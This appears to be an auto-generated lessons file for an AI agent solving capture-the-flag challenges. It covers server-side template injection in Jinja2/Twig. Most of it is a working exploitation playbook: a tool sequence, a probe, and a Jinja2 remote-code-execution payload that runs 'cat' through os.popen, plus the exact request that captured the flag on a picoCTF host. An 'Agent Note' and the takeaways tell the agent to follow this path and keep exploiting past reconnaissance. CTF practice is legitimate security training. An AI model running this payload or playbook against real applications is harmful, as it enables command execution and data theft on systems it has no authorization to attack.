# Consolidated Lessons: Server-Side Template Injection (Jinja2/Twig)

> **Auto-generated:** 2026-05-03 07:10:43 UTC
> **Category:** Server-Side Template Injection
> **Type:** consolidated_lessons (3 docs — 2 success, 1 failure)
> **Tags:** `consolidated, server_side_template_injection, lessons, high-priority, wisdom`

> **Agent Note:** This consolidates patterns from multiple runs on this category.
> Use the Quick Exploitation Path as your primary action guide.

---

## Coverage

- **Total atomic rule docs:** 3
- **Success runs:** 2
- **Failure/partial runs:** 1

## Best Exploitation Path (from most recent success)

> **Note:** Replace `<TARGET_URL>` with the current challenge URL.

1. **`http_fetch`**: Fetch the target URL to map the application and identify input forms
2. **`javascript_source`**: Inspect JS for injection points, credentials, or API endpoints
3. **`form_submit`**: Submit a payload via the identified form or API endpoint — use: `{"url":"<TARGET_URL>","method":"POST","data":{"content":"{{ cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}"},"max_body":4000}`

> **Next-step strategy:** Test every input with `{{7*7}}` first. On success, use `ssti_exploit_suggester` for RCE payloads targeting the detected engine.

## Key Takeaways (ranked by frequency across runs)

1. Follow this winning tool sequence: http_fetch → javascript_source → form_submit
2. Continue exploitation after confirming 'ssti_confirmed' — do not stop at reconnaissance
3. Pivot to a different attack vector early rather than repeating the same approach with minor variations

## Confirmed Winning Inputs

These exact requests produced the flag:

- `form_submit` input: {"url":"http://rescued-float.picoctf.net:55010/","method":"POST","data":{"content":"{{ cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}"},"max_body":4000}
